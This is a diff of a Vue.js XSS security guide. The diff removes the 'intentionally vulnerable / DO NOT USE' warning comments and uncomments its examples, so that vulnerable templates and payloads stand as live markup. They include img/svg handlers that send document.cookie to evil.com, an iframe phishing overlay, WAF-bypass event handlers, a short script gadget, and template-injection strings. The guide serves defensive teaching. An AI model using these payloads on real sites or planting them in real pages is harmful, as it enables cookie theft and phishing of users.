@@ -13,34 +13,32 @@ Severity: **Critical**
 ### Vulnerable Pattern
 ```vue
 <template>
-  <!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
   <!-- ❌ User-supplied HTML rendered raw -->
-  <!-- <div v-html="comment.body"></div> -->
+  <div v-html="comment.body"></div>
 
   <!-- ❌ Dynamic href with javascript: protocol -->
-  <!-- <a :href="userUrl">Click me</a> -->
+  <a :href="userUrl">Click me</a>
 
   <!-- ❌ Dynamic component from user input -->
-  <!-- <component :is="userControlledTag" /> -->
+  <component :is="userControlledTag" />
 </template>
 ```
 
 ### Exploit Payloads (via v-html)
 ```html
-<!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
 <!-- Image error — no user interaction needed -->
-<!-- <img src=x onerror="fetch('https://evil.com?c='+document.cookie)"> -->
+<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
 
 <!-- SVG load — fires immediately -->
-<!-- <svg onload="document.location='https://evil.com?c='+document.cookie"> -->
+<svg onload="document.location='https://evil.com?c='+document.cookie">
 
 <!-- CSS animation event — bypasses WAF denylists for onerror/onclick -->
-<!-- <style>@keyframes x{}</style> -->
-<!-- <div style="animation-name:x" onanimationstart="alert(1)"></div> -->
+<style>@keyframes x{}</style>
+<div style="animation-name:x" onanimationstart="alert(1)"></div>
 
 <!-- iframe phishing overlay -->
-<!-- <iframe src="https://evil.com/phishing" style="position:fixed;
-  top:0;left:0;width:100%;height:100%;z-index:9999;border:0"></iframe> -->
+<iframe src="https://evil.com/phishing" style="position:fixed;
+  top:0;left:0;width:100%;height:100%;z-index:9999;border:0"></iframe>
 ```
 
 ### Secure Pattern
@@ -77,14 +75,13 @@ When user input lands inside a Vue template (e.g., reflected in server-rendered 
 
 ### How It Happens
 ```html
-<!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
 <!-- Server renders user input inside #app -->
-<!-- <div id="app">
-  Welcome, <?= $_GET['name'] ?>
+<div id="app">
+  Welcome, <?= $_GET['name'] ?> <!-- server-side inject -->
 </div>
 <script>
   Vue.createApp({}).mount('#app')
-</script> -->
+</script>
 <!-- Attacker sets name to: {{_c.constructor('alert(1)')()}} -->
 <!-- Vue compiles and EXECUTES it as a JavaScript expression -->
 ```
@@ -116,9 +113,8 @@ https://evil.com/steal><input name=user placeholder=Email>
 ### Prevention
 Never reflect user input into Vue's mount point. Pass user data via data-attributes:
 ```html
-<!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
 <!-- ❌ WRONG -->
-<!-- <div id="app">Welcome, <%= user.name %></div> -->
+<div id="app">Welcome, <%= user.name %></div>
 
 <!-- ✅ RIGHT -->
 <div id="app" :data-username="serverEscaped(user.name)"></div>
@@ -147,9 +143,8 @@ Nearly every Vue directive evaluates its expression — making each one a potent
 
 ### Dynamic Components — Shortest Vector (23 chars)
 ```html
-<!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
 <!-- PortSwigger — shortest Vue2 XSS: 23 chars, 27 bytes -->
-<!-- <x is=script src=//⑭.₨> -->
+<x is=script src=//⑭.₨>
 
 <!-- Vue's "is" attribute turns <x> into <script> -->
 <!-- Unicode domain ⑭.₨ resolves to 14.rs (attacker-controlled) -->
@@ -157,9 +152,8 @@ Nearly every Vue directive evaluates its expression — making each one a potent
 
 ### slot-scope Injection
 ```html
-<!-- SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE -->
 <!-- Injects into non-template-expression attribute -->
-<!-- <p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//"> -->
+<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">
 
 <!-- If WAF blocks "this", use local scope function: -->
 <p slot-scope="){}}])+_c.constructor.constructor('alert(origin)')()})};//">
@@ -184,8 +178,7 @@ Vue's `@` shorthand (alias for `v-on`) creates event handlers processed by Vue's
 ### Why this→window Works
 Vue compiles expressions WITHOUT strict mode. Inside a function call, `this` refers to the global `window` object:
 ```
-// SECURITY EXAMPLE — intentionally vulnerable / DO NOT USE
-// {{-function(){this.alert(1)}()}}
+{{-function(){this.alert(1)}()}}
 ```
 
 ### CSP Bypass Implication
